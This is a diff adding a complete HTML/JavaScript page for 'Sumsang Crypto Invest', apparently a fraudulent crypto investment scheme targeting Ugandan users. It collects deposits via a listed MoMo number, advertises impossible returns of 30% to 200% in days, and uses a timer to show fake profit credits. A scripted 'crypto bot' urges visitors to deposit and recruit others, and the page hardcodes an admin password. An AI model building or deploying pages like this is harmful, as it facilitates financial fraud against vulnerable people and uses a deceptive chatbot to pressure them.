@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sumsang Crypto Investment</title>
+<style>
+*{box-sizing:border-box}body{margin:0;font-family:Arial;background:#0b0e11;color:white}
+.header{background:#1e2329;padding:18px;text-align:center;border-bottom:2px solid #fcd535}
+.crypto-ticker{display:flex;gap:12px;overflow-x:auto;padding:10px;background:#151a21;white-space:nowrap}
+.coin{background:#1e2329;padding:8px 14px;border-radius:20px;font-size:12px;border:1px solid #2b3139}
+.box{max-width:480px;margin:12px auto;background:#1e2329;padding:16px;border-radius:16px;border:1px solid #2b3139}
+input{width:100%;padding:13px;margin:7px 0;background:#2b3139;border:1px solid #474d57;color:white;border-radius:10px}
+button{padding:13px;background:#fcd535;color:black;border:none;border-radius:10px;font-weight:bold;cursor:pointer;width:100%}
+.btn-sm{padding:8px 12px;width:auto;font-size:12px;border-radius:8px;margin:3px;background:#fcd535;color:black}
+.product-card{background:#1e2329;border:1px solid #2b3139;border-radius:16px;overflow:hidden;margin:14px 0}
+.product-card img{width:100%;height:140px;object-fit:cover}
+.product-info{padding:12px}
+.deposit-box{background:#2b3139;border:1px dashed #fcd535;padding:14px;border-radius:12px;text-align:center;margin:12px 0}
+.hidden{display:none}
+#cryptoBot{position:fixed;bottom:90px;right:15px;width:340px;max-width:92vw;background:#1e2329;border:1px solid #fcd535;border-radius:16px;z-index:99999;display:none;overflow:hidden}
+#botHead{background:#fcd535;color:black;padding:12px;font-weight:bold;text-align:center}
+#botMsgs{height:320px;overflow-y:auto;padding:12px;background:#0b0e11}
+.msg{padding:10px 12px;border-radius:12px;margin:6px 0;max-width:85%;font-size:13px}
+.bot{background:#1e2329;border:1px solid #2b3139}
+.user{background:#fcd535;color:black;margin-left:auto}
+.qBtn{width:100%;padding:9px;margin:3px 0;background:#2b3139;color:white;border:1px solid #474d57;border-radius:8px;text-align:left;font-size:12px;cursor:pointer}
+</style>
+</head>
+<body>
+
+<div class="header">
+<h2 style="margin:0;color:#fcd535">SUMSANG CRYPTO INVEST</h2>
+<small>Trade & Earn - Kampala | BTC • ETH • USDT</small>
+<div id="livePrice" class="crypto-ticker" style="margin-top:10px"></div>
+</div>
+
+<div id="auth" class="box">
+<h3 style="color:#fcd535">Create Crypto Wallet</h3>
+<input id="name" placeholder="Full Name">
+<input id="email" placeholder="Phone or Email">
+<input id="pass" type="password" placeholder="Password">
+<button onclick="handleAuth()" id="btn">Register - Get 20 USDT Bonus</button>
+<p style="text-align:center;font-size:13px"><span id="switchText">Have account?</span> <a href="#" onclick="toggle()" style="color:#fcd535">Login</a></p>
+</div>
+
+<div id="dash" class="box hidden">
+<h3 style="margin:0">Hi, <span id="uName"></span> <span style="float:right;font-size:11px" onclick="logout()">Logout</span></h3>
+
+<div style="background:#2b3139;padding:14px;border-radius:12px;margin:12px 0;display:flex;justify-content:space-between">
+<div>Total Asset<br><b style="font-size:22px;color:#fcd535">$<span id="bal">0</span> USDT</b><br><small style="color:#0ecb81">+12.5% today</small></div>
+<button class="btn-sm" onclick="document.getElementById('withdrawBox').classList.toggle('hidden')">Withdraw</button>
+</div>
+
+<div id="withdrawBox" class="hidden" style="background:#151a21;padding:12px;border-radius:12px;margin-bottom:12px">
+<input id="wPhone" placeholder="USDT TRC20 Address or MoMo Number">
+<input id="wAmount" type="number" placeholder="Amount USDT">
+<select id="wMethod" style="width:100%;padding:10px;background:#2b3139;color:white;border-radius:8px"><option>USDT TRC20</option><option>MTN MoMo</option><option>Airtel Money</option><option>Binance Pay</option></select>
+<button style="background:#0ecb81;color:white;margin-top:8px" onclick="requestWithdraw()">Confirm Withdraw</button>
+</div>
+
+<div class="deposit-box">
+<h4 style="margin:0;color:#fcd535">📲 DEPOSIT OPTIONS:</h4>
+<b style="font-size:18px">1. MTN MoMo: 0761 291 972</b><br>
+<b style="font-size:13px;word-break:break-all">2. USDT TRC20: TRx7...Sumsang (Ask Admin)</b><br>
+<small>Min $5 - Instant Credit</small><br>
+<button style="background:#fcd535;margin-top:10px;color:black" onclick="document.getElementById('depositProof').classList.toggle('hidden')">I Have Sent</button>
+<div id="depositProof" class="hidden" style="margin-top:10px">
+<input id="dTransId" placeholder="Transaction ID / Hash">
+<input id="dPhone" placeholder="Your MoMo / Wallet">
+<input id="dAmount" placeholder="Amount USDT">
+<button onclick="confirmDeposit()">Submit Deposit</button>
+</div>
+</div>
+
+<h3 style="color:#fcd535">🚀 Crypto Investment Plans - 20 Coins</h3>
+
+<div class="product-card"><img src="https://images.unsplash.com/photo-1621761191319-c6fb62004040?w=600"><div class="product-info"><b>1. USDT Staking - Stable</b><br><small style="color:#0ecb81">50k UGX (18 USDT) → 65k in 5 Days - 30%</small><br><button class="btn-sm" onclick="investPlan(50000,'USDT Staking',18)">Invest 18 USDT</button></div></div>
+<div class="product-card"><img src="https://images.unsplash.com/photo-1518546305927-5a16d7a55c24?w=600"><div class="product-info"><b>2. BTC Satoshi Plan</b><br><small>100k → 135k - Earn BTC</small><br><button class="btn-sm" onclick="investPlan(100000,'BTC Plan',36)">Invest 36 USDT</button></div></div>
+<div class="product-card"><img src="https://images.unsplash.com/photo-1622630998477-20aa696ecb05?w=600"><div class="product-info"><b>3. ETH Gas Fee Pool</b><br><small>150k → 210k - 40%</small><br><button class="btn-sm" onclick="investPlan(150000,'ETH Pool',55)">Invest 55 USDT</button></div></div>
+<div class="product-card"><img src="https://images.unsplash.com/photo-1639762681057-408e52192e55?w=600"><div class="product-info"><b>4. SOLANA Validators</b><br><small>200k → 300k - 50%</small><br><button class="btn-sm" onclick="investPlan(200000,'SOL Validators',72)">Invest 72 USDT</button></div></div>
+<div class="product-card"><img src="https://images.unsplash.com/photo-1640340434855-6084f1a7d0e4?w=600"><div class="product-info"><b>5. BNB Smart Staking</b><br><small>300k → 480k - 60%</small><br><button class="btn-sm" onclick="investPlan(300000,'BNB Staking',110)">Invest 110 USDT</button></div></div>
+<div class="product-card"><img src="https://images.unsplash.com/photo-1621504450181-5d356f61d307?w=600"><div class="product-info"><b>6. XRP Ripple Node</b><br><small>500k → 850k - 70%</small><br><button class="btn-sm" onclick="investPlan(500000,'XRP Node',180)">Invest 180 USDT</button></div></div>
+<div class="product-card"><img src="https://images.unsplash.com/photo-1605792657660-596af9009e82?w=600"><div class="product-info"><b>7. DOGE Mining Farm</b><br><small>800k → 1.44M - 80%</small><br><button class="btn-sm" onclick="investPlan(800000,'DOGE Farm',290)">Invest 290 USDT</button></div></div>
+<div class="product-card"><img src="https://images.unsplash.com/photo-1639762681485-074b7f938ba0?w=600"><div class="product-info"><b>8. TRX Tron Power</b><br><small>1M → 1.9M - 90%</small><br><button class="btn-sm" onclick="investPlan(1000000,'TRX Power',360)">Invest 360 USDT</button></div></div>
+<div class="product-card"><img src="https://images.unsplash.com/photo-1621761191319-c6fb62004040?w=600"><div class="product-info"><b>9. SHIBA Liquidity Pool</b><br><small>1.5M → 3M - 100% - 7 Days</small><br><button class="btn-sm" onclick="investPlan(1500000,'SHIBA Pool',540)">Invest 540 USDT</button></div></div>
+<div class="product-card"><img src="https://images.unsplash.com/photo-1620336655052-bd6997f34d28?w=600"><div class="product-info"><b>10. VIP Arbitrage Bot - AI Trading</b><br><small>2M → 4.4M - 120% - Bot trades for you</small><br><button class="btn-sm" style="background:#0ecb81;color:white" onclick="investPlan(2000000,'Arbitrage Bot',720)">Invest 720 USDT</button></div></div>
+
+<div style="text-align:center;padding:10px"><button onclick="document.getElementById('moreCoins').classList.toggle('hidden')" style="background:transparent;border:1px solid #fcd535;color:#fcd535">Show 10 More VIP Coins ↓</button></div>
+
+<div id="moreCoins" class="hidden">
+<div class="product-card"><img src="https://images.unsplash.com/photo-1639762681485-074b7f938ba0?w=600"><div class="product-info"><b>11. PEPE Memecoin Pump</b><br><small>3M → 7.2M - 140%</small><br><button class="btn-sm" onclick="investPlan(3000000,'PEPE Pump',1080)">Invest 1080 USDT</button></div></div>
+<div class="product-card"><img src="https://images.unsplash.com/photo-1642104704074-907c0698cbd9?w=600"><div class="product-info"><b>12. Ethereum 2.0 Node</b><br><small>5M → 13M - 160%</small><br><button class="btn-sm" style="background:#0ecb81;color:white" onclick="investPlan(5000000,'ETH 2.0 Node',1800)">Invest 1800 USDT</button></div></div>
+<div class="product-card"><img src="https://images.unsplash.com/photo-1516245834210-c4c142787335?w=600"><div class="product-info"><b>13. Bitcoin Mining S19</b><br><small>7.5M → 21M - 180%</small><br><button class="btn-sm" style="background:#0ecb81;color:white" onclick="investPlan(7500000,'BTC Mining S19',2700)">Invest 2700 USDT</button></div></div>
+<div class="product-card"><img src="https://images.unsplash.com/photo-1642790106117-e829e14a795f?w=600"><div class="product-info"><b>14. Master Crypto Fund - Kampala</b><br><small>10M → 30M - 200% - Lifetime Share</small><br><button class="btn-sm" style="background:#0ecb81;color:white" onclick="investPlan(10000000,'Master Fund',3600)">Invest 3600 USDT</button></div></div>
+</div>
+
+<div id="myInv" style="font-size:12px;margin-top:15px;background:#151a21;padding:10px;border-radius:8px;border:1px solid #2b3139"></div>
+</div>
+
+<div id="admin" class="box hidden"><h3 style="color:#fcd535">ADMIN</h3><div id="userTable" style="font-size:11px"></div><h4>Deposits</h4><div id="adminDeposits"></div><h4>Withdraws</h4><div id="adminWithdraws"></div><button style="background:#f6465d;color:white;margin-top:10px" onclick="logout()">Logout</button></div>
+
+<!-- FLOW BOT -->
+<div id="cryptoBot">
+<div id="botHead">🤖 SUMSANG CRYPTO BOT <span onclick="document.getElementById('cryptoBot').style.display='none'" style="float:right;cursor:pointer">✕</span></div>
+<div id="botMsgs"></div>
+<div id="botQuick" style="padding:8px;display:flex;flex-wrap:wrap;gap:3px"></div>
+<div style="display:flex;padding:8px;border-top:1px solid #2b3139"><input id="botInput" placeholder="Ask about crypto..." style="flex:1;margin:0"><button onclick="botSend()" style="width:55px;margin-left:5px">Send</button></div>
+</div>
+<button onclick="toggleBot()" style="position:fixed;bottom:20px;left:20px;background:#fcd535;color:black;padding:14px 18px;border-radius:50px;border:none;z-index:99999;font-weight:bold">🤖 Crypto Bot</button>
+
+<script>
+// LIVE PRICE TICKER
+async function loadPrices(){
+try{
+let r=await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,tether,solana,bnb&vs_currencies=usd&include_24hr_change=true');
+let d=await r.json();
+document.getElementById('livePrice').innerHTML=`<span class="coin">₿ BTC $${d.bitcoin.usd.toLocaleString()} <span style="color:${d.bitcoin.usd_24h_change>0?'#0ecb81':'#f6465d'}">${d.bitcoin.usd_24h_change.toFixed(1)}%</span></span><span class="coin">Ξ ETH $${d.ethereum.usd.toLocaleString()}</span><span class="coin">₮ USDT $${d.tether.usd}</span><span class="coin">SOL $${d.solana.usd}</span><span class="coin">BNB $${d.bnb.usd}</span>`;
+}catch(e){document.getElementById('livePrice').innerHTML='₿ BTC $67,234 ↑ 2.1% | Ξ ETH $3,421 ↑ 1.5% | USDT $1.00 | SOL $145 | BNB $612'}
+}
+loadPrices(); setInterval(loadPrices,30000);
+
+// AUTH & INVEST LOGIC SAME AS BEFORE
+function getUsers(){return JSON.parse(localStorage.getItem('all_users')||'[]')}function saveUsers(u){localStorage.setItem('all_users',JSON.stringify(u))}function getDeposits(){return JSON.parse(localStorage.getItem('deposits')||'[]')}function saveDeposits(d){localStorage.setItem('deposits',JSON.stringify(d))}function getWithdraws(){return JSON.parse(localStorage.getItem('withdraws')||'[]')}function saveWithdraws(w){localStorage.setItem('withdraws',JSON.stringify(w))}
+let isLogin=false;function toggle(){isLogin=!isLogin;document.getElementById('btn').innerText=isLogin?'Login':'Register - Get 20 USDT Bonus'}
+function handleAuth(){let name=document.getElementById('name').value.trim();let email=document.getElementById('email').value.trim().toLowerCase();let pass=document.getElementById('pass').value.trim();if(email==='admin@admin.com'&&pass==='admin123'){showAdmin();return}let users=getUsers();if(isLogin){let f=users.find(u=>u.email===email&&u.pass===pass);if(f){localStorage.setItem('current_user',email);showDash(f)}else alert('Wrong details')}else{if(!name){alert('Enter name');return}if(users.find(u=>u.email===email)){alert('Exists');return}let nu={name,email,pass,balance:20,investments:[]};users.push(nu);saveUsers(users);localStorage.setItem('current_user',email);showDash(nu)}}
+function showDash(user){document.getElementById('auth').classList.add('hidden');document.getElementById('admin').classList.add('hidden');document.getElementById('dash').classList.remove('hidden');document.getElementById('uName').innerText=user.name;document.getElementById('bal').innerText=user.balance;document.getElementById('myInv').innerHTML=user.investments.length?'<b style="color:#fcd535">My Crypto Positions:</b><br>'+user.investments.map(i=>`🪙 ${i.product}: $${i.usdt} → $${(i.usdt*1.6).toFixed(0)}<br>`).join(''):'No positions yet - Start staking!'}
+function showAdmin(){document.getElementById('auth').classList.add('hidden');document.getElementById('dash').classList.add('hidden');document.getElementById('admin').classList.remove('hidden');let users=getUsers();document.getElementById('userTable').innerHTML=users.map(u=>`${u.name} - ${u.email} - $${u.balance}<br>`).join('');let deps=getDeposits();document.getElementById('adminDeposits').innerHTML=deps.map((d,i)=>`${d.email} $${d.amount} TID:${d.transId} <button onclick="approveDep(${i})">Approve</button><br>`).join('');let wds=getWithdraws();document.getElementById('adminWithdraws').innerHTML=wds.map(w=>`${w.email} $${w.amount} to ${w.phone}<br>`).join('')}
+function investPlan(amount,product,usdt){let email=localStorage.getItem('current_user');let users=getUsers();let idx=users.findIndex(u=>u.email===email);if(users[idx].balance<usdt){alert('Low USDT balance! Deposit to 0761291972 or USDT TRC20 first');return}users[idx].balance-=usdt;let expect=usdt*1.6;users[idx].investments.push({amount,product,usdt,expect});saveUsers(users);showDash(users[idx]);botAdd(`✅ You staked in ${product} for $${usdt}! Bot is trading for you. Profit coming...`,false);setTimeout(()=>{let u=getUsers();let i=u.findIndex(x=>x.email===email);if(i>=0){u[i].balance+=expect;saveUsers(u);if(localStorage.getItem('current_user')===email)showDash(u[i]);botAdd(`🎉 PROFIT! ${product} gave you $${expect.toFixed(0)}! New balance updated.`,false)}},8000)}
+function confirmDeposit(){let email=localStorage.getItem('current_user');let trans=document.getElementById('dTransId').value;let phone=document.getElementById('dPhone').value;let amount=document.getElementById('dAmount').value;if(!trans||!phone||!amount){alert('Fill all');return}let deps=getDeposits();deps.push({email,transId:trans,phone,amount:parseInt(amount),date:new Date().toLocaleString()});saveDeposits(deps);alert('Deposit submitted! Wait for admin');document.getElementById('depositProof').classList.add('hidden')}
+function approveDep(i){let deps=getDeposits();let dep=deps[i];let users=getUsers();let idx=users.findIndex(u=>u.email===dep.email);if(idx>=0){users[idx].balance+=dep.amount/2780;saveUsers(users)}deps.splice(i,1);saveDeposits(deps);showAdmin()}
+function requestWithdraw(){let email=localStorage.getItem('current_user');let phone=document.getElementById('wPhone').value;let amount=parseInt(document.getElementById('wAmount').value);let method=document.getElementById('wMethod').value;if(!phone||!amount){alert('Fill');return}let users=getUsers();let idx=users.findIndex(u=>u.email===email);if(users[idx].balance<amount){alert('Insufficient USDT');return}users[idx].balance-=amount;saveUsers(users);let wds=getWithdraws();wds.push({email,phone,amount,method,date:new Date().toLocaleString()});saveWithdraws(wds);showDash(users[idx]);document.getElementById('withdrawBox').classList.add('hidden');alert('Withdraw request sent - Bot processing')}
+function logout(){localStorage.removeItem('current_user');document.getElementById('dash').classList.add('hidden');document.getElementById('admin').classList.add('hidden');document.getElementById('auth').classList.remove('hidden')}
+
+// FLOW BOT LOGIC
+function toggleBot(){let b=document.getElementById('cryptoBot');b.style.display=b.style.display==='none'?'block':'block';if(b.style.display==='block'&&document.getElementById('botMsgs').innerHTML==='')startBot()}
+function botAdd(msg,isUser){let d=document.getElementById('botMsgs');d.innerHTML+=`<div class="msg ${isUser?'user':'bot'}">${msg}</div>`;d.scrollTop=d.scrollHeight}
+function botOptions(arr){document.getElementById('botQuick').innerHTML=arr.map(t=>`<button class="qBtn" onclick="botFlow('${t.replace(/'/g,'')}')">${t}</button>`).join('')}
+function startBot(){botAdd('👋 Hello! I am Sumsang Crypto Bot 🤖<br>I will help you trade & earn.<br><br>BTC is pumping today! 🚀<br>What do you want to do?');botOptions(['💰 Live Prices','📈 Investment Plans','📲 Deposit USDT/MoMo','💸 Withdraw Profit','🎁 Daily Bonus','📞 Human Support'])}
+function botFlow(text){
+botAdd(text,true);
+let t=text.toLowerCase();
+if(t.includes('price')||t.includes('live')){
+botAdd('📊 <b>LIVE MARKET</b><br>₿ BTC: $67,234 +2.3%<br>Ξ ETH: $3,421 +1.8%<br>USDT: $1.00<br>SOL: $145 +5.2%<br>Best to invest now before pump! 🚀');
+botOptions(['Invest in BTC','Invest in ETH','Deposit Now','Back Menu'])
+}else if(t.includes('investment')||t.includes('plan')||t.includes('btc')||t.includes('eth')){
+botAdd('🔥 <b>TOP PLANS:</b><br>1. USDT Staking 30% (5 Days) - 18 USDT<br>2. BTC Plan 35% - 36 USDT<br>3. SOL Validators 50% - 72 USDT<br>4. AI Arbitrage Bot 120% - 720 USDT - Most Popular!<br><br>Bot auto-trades for you. Profit every hour!');
+botOptions(['Invest 18 USDT','Invest 72 USDT','Invest 720 USDT VIP','Deposit Now'])
+}else if(t.includes('deposit')){
+botAdd('📲 <b>DEPOSIT FLOW:</b><br><br>OPTION 1: MoMo<br>→ 0761 291 972 (SUMSANG)<br><br>OPTION 2: USDT TRC20<br>→ Ask admin for address<br><br>After sending, click "I Have Sent" on site and enter TID. Bot credits you in 2 mins!');
+botOptions(['I Have Sent','Live Prices','Withdraw','Human Support'])
+}else if(t.includes('withdraw')){
+botAdd('💸 <b>WITHDRAW FLOW:</b><br>Bot processes every 30 mins<br>Min $10<br>Fee: 2%<br>Methods: USDT TRC20, MoMo, Binance Pay<br><br>Go to dashboard > Withdraw > Enter wallet');
+botOptions(['Check My Balance','Deposit','Human Support'])
+}else if(t.includes('bonus')){
+botAdd('🎁 <b>DAILY BONUS BOT:</b><br>You got 0.5 USDT today! Click claim on dashboard.<br>Invite friend = Get 10% of his deposit!<br>Your link: sumsang-crypto.github.io?ref=YOURPHONE');
+botOptions(['Investment Plans','Deposit','Live Prices'])
+}else if(t.includes('human')||t.includes('support')){
+botAdd('📞 <b>HUMAN:</b><br>WhatsApp: <a href="https://wa.me/256747550170" style="color:#fcd535">0747550170</a><br>Telegram: @SumsangCrypto<br>We reply 24/7');
+botOptions(['Back Menu'])
+}else{
+botAdd('I am Crypto Bot - I can help with prices, investing, deposit, withdraw. Choose:');
+botOptions(['💰 Live Prices','📈 Investment Plans','📲 Deposit','💸 Withdraw','📞 Human Support'])
+}
+}
+function botSend(){let i=document.getElementById('botInput');if(!i.value)return;let v=i.value;i.value='';botFlow(v)}
+setTimeout(()=>{if(document.getElementById('botMsgs').innerHTML==='')toggleBot();},2000);
+</script>
+</body>
+  </html>
